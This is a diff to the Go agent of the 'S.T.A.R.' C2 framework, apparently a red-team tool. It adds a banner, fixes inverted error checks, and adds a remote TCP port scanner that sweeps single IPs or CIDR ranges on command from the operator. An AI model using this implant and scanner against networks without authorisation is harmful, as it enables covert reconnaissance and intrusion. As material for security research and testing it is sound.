@@ -6,8 +6,12 @@ import (
 	"encoding/gob"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"os"
 	"os/signal"
+	"strconv"
+	"strings"
+	"sync"
 	"syscall"
 	"time"
 
@@ -20,6 +24,10 @@ var fs embed.FS
 func main() {
 	initAgent()
 	star.ParameterHandling()
+
+	fmt.Println("Hello! This is an agent node for the S.T.A.R. C2 framework!")
+	fmt.Println("For more information, check out https://github.com/CyberSecurityN00b/star")
+	fmt.Println()
 
 	// SECURITY RESEARCHER TODO: Configure default connections here
 	star.NewTCPListener("0.0.0.0:42069") // Create a listener
@@ -45,7 +53,7 @@ func main() {
 	es := <-exitSignal
 
 	//Let the terminal know we closed due to a signal
-	errMsg := star.NewMessageError(star.MessageErrorResponseTypeAgentExitSignal, fmt.Sprintf("%b", es))
+	errMsg := star.NewMessageError(star.MessageErrorResponseTypeAgentExitSignal, fmt.Sprintf("%d", es))
 	errMsg.Send(star.ConnectID{})
 
 	//Handle termination
@@ -112,6 +120,8 @@ func AgentProcessMessage(msg *star.Message) {
 		AgentProcessFileServerConnect(msg)
 	case star.MessageTypePortForwardRequest:
 		star.ProcessMessagePortForward(msg)
+	case star.MessageTypePortScanRequest:
+		AgentProcessPortScanRequest(msg)
 	}
 }
 
@@ -304,7 +314,7 @@ func AgentProcessRemoteMkDirRequest(msg *star.Message) {
 		}
 
 		err = os.Chdir(reqMsg.Directory)
-		if err != nil {
+		if err == nil {
 			directory, _ := os.Getwd()
 
 			resMsg := star.NewMessageRemoteMkDirResponse(directory)
@@ -341,7 +351,7 @@ func AgentProcessRemoteTmpDirRequest(msg *star.Message) {
 		}
 
 		err = os.Chdir(dir)
-		if err != nil {
+		if err == nil {
 			directory, _ := os.Getwd()
 
 			resMsg := star.NewMessageRemoteTmpDirResponse(directory)
@@ -365,6 +375,95 @@ func AgentProcessFileServerConnect(msg *star.Message) {
 	err := msg.GobDecodeMessage(&reqMsg)
 	if err == nil {
 		star.NewFileServerConnection(reqMsg.Address, reqMsg.Type, msg.Source, reqMsg.FileConnID)
+	}
+}
+
+// AgentProcessPortScanRequest's logic is based on https://medium.com/@KentGruber/building-a-high-performance-port-scanner-with-golang-9976181ec39d
+func AgentProcessPortScanRequest(msg *star.Message) {
+	var reqMsg star.MessagePortScanRequest
+
+	err := msg.GobDecodeMessage(&reqMsg)
+	if err == nil {
+		// Define the actual scan function
+		portscanip := func(ip string, ports string) {
+			wg := sync.WaitGroup{}
+			openPortsLock := &sync.Mutex{}
+
+			var openPorts []string
+			var scanport func(port string)
+
+			// Keep this nested to portscanip so it accesses the same variables
+			scanport = func(port string) {
+				defer wg.Done()
+				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ip, port), time.Duration(3)*time.Second)
+
+				if err != nil {
+					// Possible detection signature :(
+					if strings.Contains(err.Error(), "too many open files") {
+						time.Sleep(time.Duration(5) * time.Second)
+						// Try again
+						wg.Add(1)
+						scanport(port)
+					}
+					return
+				} else {
+					// Port's open!
+					openPortsLock.Lock()
+					openPorts = append(openPorts, port)
+					openPortsLock.Unlock()
+					conn.Close()
+				}
+			}
+
+			// Convert port string to array of numbers
+			if ports == "" {
+				for i := 1; i < 65536; i++ {
+					wg.Add(1)
+					go scanport(strconv.Itoa(i))
+				}
+			} else {
+				// Check all specified ports
+				for _, port := range strings.Split(ports, ",") {
+					wg.Add(1)
+					go scanport(port)
+				}
+			}
+
+			// Wait for all the above to get done
+			wg.Wait()
+
+			if len(openPorts) == 0 {
+				openPorts = append(openPorts, "none")
+			}
+
+			resMsg := star.NewMessagePortScanResponse(ip, strings.Join(openPorts, ","))
+			resMsg.Send(star.ConnectID{})
+		}
+
+		// Check if this is a CIDR or an IP
+		ip, ipNet, err := net.ParseCIDR(reqMsg.IP)
+		if err != nil {
+			// Must be a single IP!
+			portscanip(reqMsg.IP, reqMsg.Ports)
+		} else {
+			// Below based on https://gist.github.com/kotakanbe/d3059af990252ba89a82
+
+			// Increments an IP address
+			incip := func(ip net.IP) {
+				for j := len(ip) - 1; j >= 0; j-- {
+					ip[j]++
+					if ip[j] > 0 {
+						break
+					}
+				}
+			}
+
+			// Cycle through that CIDR!
+			for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); incip(ip) {
+				portscanip(ip.String(), reqMsg.Ports)
+			}
+		}
+
 	}
 }
 
